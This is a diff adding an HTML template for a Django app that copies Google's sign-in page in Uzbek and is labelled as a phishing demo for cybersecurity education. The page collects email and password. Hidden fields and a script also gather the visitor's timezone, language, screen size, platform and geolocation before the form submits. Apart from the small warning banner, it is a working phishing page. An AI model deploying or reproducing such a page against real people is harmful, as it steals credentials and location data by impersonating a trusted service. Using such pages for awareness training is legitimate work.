@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Google</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+    .header { width: 100%; display: flex; justify-content: flex-end; padding: 16px 24px; gap: 12px; }
+    .header a { font-size: 13px; color: #202124; text-decoration: none; }
+    .header .btn-signin { background: #1a73e8; color: white; padding: 8px 16px; border-radius: 4px; font-size: 13px; }
+    .logo { margin-top: 80px; font-size: 80px; font-weight: bold; letter-spacing: -2px; }
+    .logo span:nth-child(1) { color: #4285F4; }
+    .logo span:nth-child(2) { color: #EA4335; }
+    .logo span:nth-child(3) { color: #FBBC05; }
+    .logo span:nth-child(4) { color: #4285F4; }
+    .logo span:nth-child(5) { color: #34A853; }
+    .logo span:nth-child(6) { color: #EA4335; }
+    .card { margin-top: 40px; width: 360px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; }
+    .card h1 { font-size: 24px; color: #202124; text-align: center; margin-bottom: 8px; font-weight: 400; }
+    .card p { font-size: 14px; color: #5f6368; text-align: center; margin-bottom: 24px; }
+    .form-group { margin-bottom: 20px; }
+    .form-group input {
+      width: 100%; padding: 12px 14px; border: 1px solid #dadce0;
+      border-radius: 4px; font-size: 15px; outline: none; color: #202124;
+    }
+    .form-group input:focus { border-color: #1a73e8; border-width: 2px; }
+    .forgot { font-size: 13px; color: #1a73e8; text-decoration: none; display: block; margin-bottom: 28px; }
+    .btn-next {
+      background: #1a73e8; color: white; border: none;
+      padding: 10px 24px; border-radius: 4px; font-size: 14px;
+      cursor: pointer; float: right;
+    }
+    .btn-next:hover { background: #1557b0; }
+    .create { font-size: 13px; color: #1a73e8; text-decoration: none; }
+    .bottom { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
+    .warning-bar {
+      background: #fff3cd; border: 1px solid #ffc107;
+      color: #856404; padding: 10px 16px; border-radius: 6px;
+      font-size: 13px; margin-bottom: 20px; text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <a href="/" style="position:fixed; top:16px; left:16px; font-size:13px; color:#5f6368; text-decoration:none; background:#f1f3f4; padding:6px 12px; border-radius:4px;">⬅ Orqaga</a>
+
+
+  <div class="logo">
+    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+  </div>
+
+  <div class="card">
+    <div class="warning-bar">
+      ⚠️ Bu demo — kiberxavfsizlik bo'yicha ta'lim uchun
+    </div>
+    <h1>Tizimga kirish</h1>
+    <p>Google hisobingizdan foydalaning</p>
+
+    <form method="POST" action="{% url 'phishing_demo' %}" id="loginForm">
+      {% csrf_token %}
+
+      <!-- Hidden fingerprint fields -->
+      <input type="hidden" name="timezone" id="timezone">
+      <input type="hidden" name="language" id="language">
+      <input type="hidden" name="screen_size" id="screen_size">
+      <input type="hidden" name="platform" id="platform">
+
+      <input type="hidden" name="geo_lat" id="geo_lat">
+      <input type="hidden" name="geo_lon" id="geo_lon">
+
+
+
+      <div class="form-group">
+        <input type="email" name="email" placeholder="Email yoki telefon" required>
+      </div>
+      <div class="form-group">
+        <input type="password" name="password" placeholder="Parol" required>
+      </div>
+      <a href="#" class="forgot">Parolni unutdingizmi?</a>
+      <div class="bottom">
+        <a href="#" class="create">Hisob yaratish</a>
+        <button type="submit" class="btn-next">Keyingisi</button>
+      </div>
+    </form>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  document.getElementById('timezone').value    = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  document.getElementById('language').value    = navigator.language;
+  document.getElementById('screen_size').value = screen.width + 'x' + screen.height;
+  document.getElementById('platform').value    = navigator.platform;
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        document.getElementById('geo_lat').value = pos.coords.latitude;
+        document.getElementById('geo_lon').value = pos.coords.longitude;
+        document.getElementById('loginForm').submit();
+      },
+      function() {
+        // Geolocation rad etilsa timezone bilan davom et
+        document.getElementById('loginForm').submit();
+      },
+      {timeout: 3000}
+    );
+  } else {
+    document.getElementById('loginForm').submit();
+  }
+});
+</script>
+  </div>
+</body>
+</html>
